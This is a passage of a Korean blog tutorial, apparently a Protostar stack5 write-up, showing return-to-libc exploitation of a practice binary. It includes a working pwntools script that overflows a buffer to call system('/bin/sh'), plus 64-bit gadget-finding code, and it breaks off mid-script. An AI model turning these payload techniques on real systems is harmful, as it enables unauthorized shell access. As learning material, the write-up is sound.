    &lt;p&gt;이제 ‘/bin/sh’ 문자열을 찾아야 한다. &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;find &amp;amp;system,+999999999,&quot;/bin/sh&quot;&lt;/code&gt; 명령어를 이용하면 쉽게 찾을 수 있다. system 함수의 시작 주소부터 명시된 숫자만큼 올려가며 주어진 문자열을 찾으라는 명령어다.&lt;/p&gt;

    &lt;p&gt;&lt;img src=&quot;/assets/img/posts/protostar5/Untitled%203.jpeg&quot; alt=&quot;Untitled&quot; /&gt;&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;libc에서 찾기&lt;/p&gt;

    &lt;p&gt;타겟 프로그램이 사용하는 라이브러리와 그것이 적재되는 주소를 알아낼 수 있는 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ldd {program_name}&lt;/code&gt; 명령어를 사용한다.&lt;/p&gt;

    &lt;p&gt;&lt;img src=&quot;/assets/img/posts/protostar5/Untitled%204.jpeg&quot; alt=&quot;Untitled&quot; /&gt;&lt;/p&gt;

    &lt;p&gt;libc 라이브러리의 디렉토리상의 위치와 실질 메모리상 적재 위치를 알 수 있다.&lt;/p&gt;

    &lt;p&gt;그럼 objdump를 이용해 libc.so.6 상에 위치하는 system 함수의 오프셋을 알아내면 된다.&lt;/p&gt;

    &lt;p&gt;&lt;img src=&quot;/assets/img/posts/protostar5/Untitled%205.jpeg&quot; alt=&quot;Untitled&quot; /&gt;&lt;/p&gt;

    &lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;0x3d3d0&lt;/code&gt;이 system 함수의 오프셋인 것처럼 보인다. 실제로 libc.so.6의 시작 주소인 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;0xf7dde000&lt;/code&gt; 에 오프셋인 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;0x3d3d0&lt;/code&gt;을 더하면 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;0xf7e1b3d0&lt;/code&gt;으로 system 함수의 시작 주소가 맞다.&lt;/p&gt;

    &lt;p&gt;그런데 궁금증이 생긴다. 저기 libc_system 뒤에 붙어 있는 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;@@GLIBC_PRIVATE&lt;/code&gt;가 대체 뭐지? 궁금해서 알아보니 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;@@&lt;/code&gt;는 default 버전임을 의미하고, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;GLIBC_PRIVATE&lt;/code&gt; 심볼은 라이브러리 링커 내에서만 사용되는 내부 규약으로 링커가 공유 라이브러리들끼리 서로를 refer 할 때 쓰는 인터페이스의 wrapper를 의미한다는 점을 알게 되었다.&lt;/p&gt;

    &lt;p&gt;사실 계산을 잘못 해서 objdump로 알아낸 system 함수의 적재 주소와 gdb로 알아낸 주소가 다른 줄 알고 원인을 알아내고 싶어 삽질을 엄청나게 하는 바람에 리눅스의 파일 링크와 링커-공유 라이브러리 간의 호출에 대해 공부하게 되었는데, 해당 내용은 맨 밑에서 자세히 설명한다.&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;pwntools 사용해 libc 뒤지기&lt;/p&gt;

    &lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt; &lt;span class=&quot;kn&quot;&gt;from&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;pwn&lt;/span&gt; &lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;
 &lt;span class=&quot;n&quot;&gt;libc&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ELF&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&apos;/lib/i386-linux-gnu/libc.so.6&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
    
 &lt;span class=&quot;k&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&apos;system = &apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;hex&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;libc&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;symbols&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&apos;system&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]))&lt;/span&gt;
 &lt;span class=&quot;k&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&apos;/bin/sh = &apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;hex&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;list&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;libc&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;search&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;sa&quot;&gt;b&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&apos;/bin/sh&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]))&lt;/span&gt;
 &lt;span class=&quot;k&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&apos;/bin/sh = &apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;hex&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;next&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;libc&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;search&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;sa&quot;&gt;b&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&apos;/bin/sh&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))))&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;    &lt;/div&gt;

    &lt;p&gt;위의 코드를 이용하면 아래와 같은 결과가 나온다.&lt;/p&gt;

    &lt;p&gt;&lt;img src=&quot;/assets/img/posts/protostar5/Untitled%206.jpeg&quot; alt=&quot;Untitled&quot; /&gt;&lt;/p&gt;
  &lt;/li&gt;
&lt;/ol&gt;

&lt;h3 id=&quot;133-익스플로잇-생성&quot;&gt;1.3.3. 익스플로잇 생성&lt;/h3&gt;

&lt;p&gt;이제까지 알아낸 정보를 취합하면 페이로드의 구조를 아래와 같이 지정할 수 있다.&lt;/p&gt;

&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;mh&quot;&gt;0x4c&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;dump&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0xf7e1b3d0&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;4&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;byte&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;dump&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0xf7f5c1db&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;하지만 여기에 함정이 있다. 초반에 설명했던 컴파일 옵션 때문이다. 컴파일 시 나는 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;mpreferred-stack-boundary=4&lt;/code&gt; 로 줬다. 원래는 64bit로 컴파일 하려다가 급하게 32bit로 방향을 바꾸는 바람에 값을 2로 바꾸는 걸 깜빡했다!!!!!!!!!!!!!!!!!!!!!!!!!!!!!&lt;/p&gt;

&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;mpreferred-stack-boundary&lt;/code&gt; 는 스택을 정리해 주고, 주어진 값을 n이라 할 때 2^n의 배수로 스택 프레임의 바닥이 지정되도록 align해주는 옵션이다. 32 bit 컴파일 시에는 값을 2로 줘야 4의 배수로 스택 프레임의 바닥이 정리되기 때문에 편하고, 64bit 컴파일 시에는 값을 4로 줘야 16의 배수로 스택 프레임의 바닥이 오면서 스택이 정리되기 때문에 편한데… 나는 32bit로 컴파일하면서 값을 4로 줬다. 그래서 함수의 에필로그가 변하는 바람에 자꾸만 페이로드가 먹히지 않았다.&lt;/p&gt;

&lt;p&gt;32 bit로 컴파일하면서 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;mpreferred-stack-boundary&lt;/code&gt; 를 제대로 설정하지 않으면 아래와 같은 에필로그가 나온다.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/posts/protostar5/Untitled%207.jpeg&quot; alt=&quot;Untitled&quot; /&gt;&lt;/p&gt;

&lt;p&gt;아무래도 해당 옵션의 디폴트 값이 4라서 16의 배수로 스택 프레임의 꼭대기가 끝나는 상황인지라, 필요한 것보다 더 할당된 스택을 정리하기 위해 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;lea esp,[ecx-0x4]&lt;/code&gt; 인스트럭션이 추가되어 있다.&lt;/p&gt;

&lt;p&gt;옵션을 제대로 주면 해당 인스트럭션이 없는 클래식한 에필로그를 볼 수 있다.&lt;/p&gt;

&lt;p&gt;추가로 말하자면, 위와 같은 상황일 때 함수의 프롤로그도 새로운 형식이 되어 나타난다. 애초에 16의 배수로 스택 시작점을 align할 필요가 없는 32bit 프로그램이다 보니 억지로 ebp 주소를 16의 배수로 맞추기 위해 아래와 같은 프롤로그가 보인다.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/posts/protostar5/Untitled%208.jpeg&quot; alt=&quot;Untitled&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;0xfffffff0&lt;/code&gt; 과 and 연산을 함으로써 무조건 16의 배수로 만든 esp를 ebp에 넣어서 스택의 바닥을 지정하는 부분이 보인다.&lt;/p&gt;

&lt;p&gt;다시 핵심으로 돌아와, 대상 파일을 컴파일해 앞의 과정을 다시 밟은 이후 페이로드를 지정한다면 아래처럼 쉘을 딸 수 있다.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/posts/protostar5/Untitled%209.jpeg&quot; alt=&quot;Untitled&quot; /&gt;&lt;/p&gt;

&lt;p&gt;물론 스크립트를 작성해 익스플로잇을 수행할 수도 있다.&lt;/p&gt;

&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c1&quot;&gt;# stack5_32_exploit.py
&lt;/span&gt;&lt;span class=&quot;kn&quot;&gt;from&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;pwn&lt;/span&gt; &lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;

&lt;span class=&quot;n&quot;&gt;p&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;process&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&apos;./stack5_32&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;

&lt;span class=&quot;n&quot;&gt;system_add&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;p32&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0xf7e1b3d0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;ret_corrupt&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;p32&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x41414141&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;str_add&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;p32&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0xf7f5c1db&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;

&lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;sa&quot;&gt;b&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&apos;A&apos;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x44&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;system_add&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ret_corrupt&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;str_add&lt;/span&gt;

&lt;span class=&quot;n&quot;&gt;p&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sendline&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;

&lt;span class=&quot;n&quot;&gt;p&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;interactive&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;hr /&gt;
&lt;p&gt;&lt;br /&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h1 id=&quot;2-x86-64-기반에서-rtl-수행하기&quot;&gt;2. X86-64 기반에서 RTL 수행하기&lt;/h1&gt;

&lt;p&gt;앞서 익스플로잇의 세 단계 중 두 단계를 끝냈기 때문에 이 절에서는 마지막 단계에 대해서만 서술한다.&lt;/p&gt;

&lt;ol&gt;
  &lt;li&gt;대상 프로그램 분석해 취약점 지정&lt;/li&gt;
  &lt;li&gt;해당 취약점을 익스플로잇할 방법 지정&lt;/li&gt;
  &lt;li&gt;익스플로잇 생성&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h2 id=&quot;21-페이로드가-왜-이-모양이야&quot;&gt;2.1. 페이로드가 왜 이 모양이야?&lt;/h2&gt;

&lt;p&gt;64비트로 컴파일된 프로그램에 RTL을 하려면 아래와 같은 페이로드를 넣어야 한다.&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;offset bytes + Gadget address(pop rdi;ret;) + parameter address + Library function address
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;대체 왜 그런 거지 싶다. 이유는 정말 간단한데, 앞서 설명했던 Cdecl 규정, 함수의 Calling Convention 때문이다. x86-64에서는 함수의 첫 파라미터 6개가 rdi, rsi, rdx, rcx, r8, r9에 순서대로 들어가고, 그러고도 파라미터가 남는다면 뒤에서부터 스택에 들어간다는 것을 꼭 기억하자.&lt;/p&gt;

&lt;p&gt;우리는 system() 함수에 “/bin/sh” 문자열의 주소를 첫 번째이자 마지막 인자로 전달하는 것이 목적이다. 즉, “/bin/sh”의 주소를 rdi에 저장해야만 한다. 그렇게 하기 위해&lt;/p&gt;

&lt;ol&gt;
  &lt;li&gt;스택 프레임의 ret add에 메모리에 적재된 수많은 인스트럭션 중 어딘가에 있을 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;pop rdi;ret&lt;/code&gt; 의 주소를 넣고&lt;/li&gt;
  &lt;li&gt;해당 인스트럭션 중 첫 번째로 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;pop rdi&lt;/code&gt; 가 실행된다면 rsp가 위치한 곳, 즉 현재 ret address의 바로 아래 위치가 rdi에 담기고 rsp가 한 주소 아래로 내려가게 될 것을 이용한다.&lt;/li&gt;
  &lt;li&gt;직후 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ret&lt;/code&gt; 가 실행될 것, 즉 현재 위치한 rsp가 가리키는 스택 위치에 담긴 주소가 rip에 담겨 이다음에 실행될 것을 이용한다.&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;이러한 흐름을 성공시키기 위해 페이로드는 위와 같은 형태가 된다.&lt;/p&gt;

&lt;p&gt;이 시점에서 알아내야 하는 정보는 4개로 좁혀진다.&lt;/p&gt;

&lt;ol&gt;
  &lt;li&gt;Offset byte의 크기&lt;/li&gt;
  &lt;li&gt;Gadget의 주소&lt;/li&gt;
  &lt;li&gt;“/bin/sh”의 주소&lt;/li&gt;
  &lt;li&gt;system의 주소&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h2 id=&quot;22-익스플로잇-생성&quot;&gt;2.2. 익스플로잇 생성&lt;/h2&gt;

&lt;h3 id=&quot;221-offset-byte의-크기-알기&quot;&gt;2.2.1. Offset Byte의 크기 알기&lt;/h3&gt;

&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;disas main&lt;/code&gt; 명령어를 이용한다.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/posts/protostar5/Untitled%2010.jpeg&quot; alt=&quot;Untitled&quot; /&gt;&lt;/p&gt;

&lt;p&gt;gets에 들어가는 첫 번째 인자를 저장하는 rdi에 들어가는 값을 확인해 보면 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;rbp-0x40&lt;/code&gt; 임을 알 수 있다. 즉, rbp까지를 오염시키기 위해 0x48 bytes가 필요함을 알 수 있다.&lt;/p&gt;

&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;offset byte = 0x48 bytes&lt;/code&gt;&lt;/p&gt;

&lt;h3 id=&quot;222-gadget의-주소-알기&quot;&gt;2.2.2. Gadget의 주소 알기&lt;/h3&gt;

&lt;p&gt;목표하는 gadget은 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;pop rdi;ret;&lt;/code&gt; 이다. 이를 찾기 위해 pwntools를 이용한다.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/posts/protostar5/Untitled%2011.jpeg&quot; alt=&quot;Untitled&quot; /&gt;&lt;/p&gt;

&lt;p&gt;타겟 프로그램은 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/lib/x86_64-linux-gnu/libc.so.6&lt;/code&gt; 을 사용하고 있음을 확인했다.&lt;/p&gt;

&lt;p&gt;따라서 가젯을 찾아오는 스크립트는 아래와 같다.&lt;/p&gt;

&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;kn&quot;&gt;from&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;pwn&lt;/span&gt; &lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;

&lt;span class=&quot;n&quot;&gt;libc&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ELF&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&apos;/lib/x86_64-linux-gnu/libc.so.6&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;gadget&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ROP&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;libc&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;

&lt;span class=&quot;k&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&apos;gadget(ret rdi;ret;) = &apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;hex&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;((&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;gadget&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;find_gadget&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;([&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&apos;pop rdi&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&apos;ret&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;])[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;])))&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&apos;system=&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;hex&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;libc&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;symbols&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&apos;system&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]))&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&apos;/bin/sh=&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;hex&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;list&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;libc&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;search&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;sa&quot;&gt;b&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&apos;/bin/sh&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]))&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;스크립트 실행 결과는 아래와 같았다.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/posts/protostar5/Untitled%2012.jpeg&quot; alt=&quot;Untitled&quot; /&gt;&lt;/p&gt;

&lt;p&gt;앞서 알아둔 라이브러리 시작 주소가 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;0x7ffff7a0364f&lt;/code&gt; 이고, 가젯의 오프셋이 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;0x2164f&lt;/code&gt; 이므로 둘을 더한 결과값인 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;0x7ffff7a0364f&lt;/code&gt; 에 정말로 가젯이 적재되어 있는지 gdb로 확인해 보자.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/posts/protostar5/Untitled%2013.jpeg&quot; alt=&quot;Untitled&quot; /&gt;&lt;/p&gt;

&lt;p&gt;적재되어 있다.&lt;/p&gt;

&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Gadget address = 0x7ffff7a0364f&lt;/code&gt;&lt;/p&gt;

&lt;h3 id=&quot;223-binsh과-system의-주소-알기&quot;&gt;2.2.3. “/bin/sh”과 system의 주소 알기&lt;/h3&gt;

&lt;p&gt;위에서 가젯의 위치를 알아내기 위한 스크립트에서 이미 알아냈기 때문에 값만 쓰고 생략한다.&lt;/p&gt;

&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;System offset = 0x4f420&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/bin/sh offset = 0x1b3d88&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;일일이 더하고 싶지 않기 때문에 계산은 스크립트에게 맡겨야겠다.&lt;/p&gt;

&lt;h3 id=&quot;224-익스플로잇-생성&quot;&gt;2.2.4. 익스플로잇 생성&lt;/h3&gt;

&lt;blockquote&gt;
  &lt;p&gt;🤩: 좋아 이제 스크립트만 실행하면 끝이다!&lt;/p&gt;

  &lt;p&gt;🤨: 아니 그런데 왜 안돼&lt;/p&gt;

  &lt;p&gt;🤯: 아 SEGFAULT다&lt;/p&gt;

  &lt;p&gt;💩: 하….&lt;/p&gt;

&lt;/blockquote&gt;

&lt;p&gt;이럴 땐 당황하지 말고 침착하게 트러블슈팅을 시작하면 된다. 물론 나는 너무 당황해서 찔끔 울긴 했는데&lt;/p&gt;

&lt;p&gt;pwntools에서 제공하는 기능 중, gdb에 현재 프로세스를 attach하게 해주는 기능이 있다. 현재 프로세스의 pid를 가져와 그것을 gdb에게 주는 식의 매커니즘인데, 이를 사용하는 방법은 아래와 같다.&lt;/p&gt;

&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;kn&quot;&gt;from&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;pwn&lt;/span&gt; &lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;

&lt;span class=&quot;n&quot;&gt;libc&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ELF&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&apos;/lib/x86_64-linux-gnu/libc.so.6&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;gadget&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ROP&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;libc&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;

&lt;span class=&quot;n&quot;&gt;libc_base&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x7ffff79e2000&lt;/span&gt;

